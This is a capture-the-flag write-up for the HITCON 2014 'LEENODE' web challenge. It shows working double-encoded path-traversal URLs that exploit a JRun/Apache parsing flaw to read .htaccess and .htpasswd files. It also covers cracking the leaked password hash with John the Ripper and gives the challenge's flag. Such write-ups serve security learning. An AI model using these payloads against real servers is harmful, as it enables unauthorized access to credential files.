# HITCON CTF 2014: LEENODE

**Category:** Web
**Points:** 250
**Description:**

> http://203.66.57.98/

## Write-up

[Source](https://wiki.mma.club.uec.ac.jp/CTF/Writeup/HITCON2014/LEENODE) (Modified only slightly for grammar and Markdown formatting)

1. Perhaps what we need to do is access the `/admin/` directory.
2. The server is Apache/2.0.65 (Unix) JRun/4.0 Server.
3. `*.jsp` was redirected to JRun Server.
*  [http://203.66.57.98/a.jsp](http://203.66.57.98/a.jsp)
4. A vulnerability for JRun exists publicly
* [http://www.kb.cert.org/vuls/id/977440](http://www.kb.cert.org/vuls/id/977440)
5. [http://203.66.57.98/a;.jsp](http://203.66.57.98/a;.jsp) gives a 500 Internal Server Error. Interestingly enough Apache serves up this error, not JRun as expected.
6. Escaping the URL for Apache as such [http://203.66.57.98/a%253b.jsp](http://203.66.57.98/a%253b.jsp) gives a 404 Error by JRun instead of the expected Apache.
7. Apache blocks many attempts to read `/.htaccess` and `/admin/.htaccess` so other tricks are needed.
8. It is discovered that JRun recognizes backslash as a directory separator as [http://203.66.57.98/.%5Ca%253b.jsp](http://203.66.57.98/.%5Ca%253b.jsp) was handled as /a by JRun.
9. Eventually `/admin/.htaccess` and `/admin/.htpasswd` are read using the following URLs respectively
[http://203.66.57.98/.%5Cadmin%5C.htaccess%253b.jsp](http://203.66.57.98/.%5Cadmin%5C.htaccess%253b.jsp)
[http://203.66.57.98/.%5Cadmin%5C.htpasswd%253b.jsp](http://203.66.57.98/.%5Cadmin%5C.htpasswd%253b.jsp)

`.htaccess` reads as follows:

```
AuthName "Restricted Area"
AuthType Basic
AuthUserFile /usr/local/apache2/htdocs/admin/.htpasswd
AuthGroupFile /dev/null
require valid-user
```

`.htpasswd` reads as follows:


```
hitc0n_1een0de:nlGc3XNhkrL1o
```

10. Let’s use John the Ripper to crack the password:

```
% john .htpasswd
ktw2z            (hitc0n_1een0de)
guesses: 1  time: 0:00:01:13 DONE (Sat Aug 16 20:58:25 2014)  c/s: 5319K  trying: ktkcK - kk4iT
```

The password is `ktw2z`.

11. Visit [http://203.66.57.98/admin/thefl4g.txt](http://203.66.57.98/admin/thefl4g.txt) and get the flag

```
The flag is HITCON{u_d0nt_f0rg3t_d0uble_3nc0ding!}
```

## Other write-ups and resources

* [notes](http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt)
